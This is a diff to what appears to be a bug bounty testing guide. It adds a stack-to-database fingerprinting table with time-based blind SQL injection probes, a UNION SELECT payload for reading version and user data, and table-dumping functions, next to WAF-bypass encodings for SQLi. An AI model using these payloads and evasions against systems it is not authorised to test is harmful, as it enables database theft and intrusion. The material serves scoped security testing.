@@ -363,6 +363,16 @@ grep -rn "mysql_query\|mysqli_query" --include="*.php" | grep "\$"
 
 **WAF bypass for SQLi**: Run `tools/waf_encoder.py "<payload>" --class sqli` for comment-injection (`SE/**/LECT`), MySQL version comment (`/*!50000 UNION*/`), case-mix (`SeLeCt`), operator substitute (`OR`→`||`, `=`→`LIKE`), whitespace swap (`%0a`, `%0b`, `/**/ `). AWS WAF specifically: try `/**/` between every token. ModSecurity: try `/*!50000 UNION*/` + `%0a` space substitution.
 
+### Stack → DBMS (fingerprint before blind testing, or you miss it)
+| Tech signal | DBMS | Blind probe |
+|---|---|---|
+| `.asp`/IIS/ASP.NET | MSSQL | `WAITFOR DELAY '0:0:5'` |
+| `.php`/LAMP | MySQL/MariaDB | `SLEEP(5)` |
+| Java/Spring, `.jsp` | PG/MSSQL/Oracle | `pg_sleep(5)` / `WAITFOR` / `dbms_pipe.receive_message('a',5)` |
+| Python/Rails | PG/MySQL | `pg_sleep(5)` / `SLEEP(5)` |
+
+**Prove it (read-only):** `ORDER BY N` → column count; `0' UNION SELECT NULL,@@version,NULL--` (or `version()` / `current_user`) → readable data = valid finding. Dump one table in a single request: `GROUP_CONCAT` (MySQL) / `STRING_AGG` (MSSQL 2017+, PG) / `LISTAGG` (Oracle). Reading a credentials/config table is reportable on its own — RCE not required (and DB→OS escalation is usually out of BBP scope: only when the DB user is sysadmin/superuser AND host exec is in scope).
+
 ---
 
 ## 8. OAUTH / OIDC BUGS
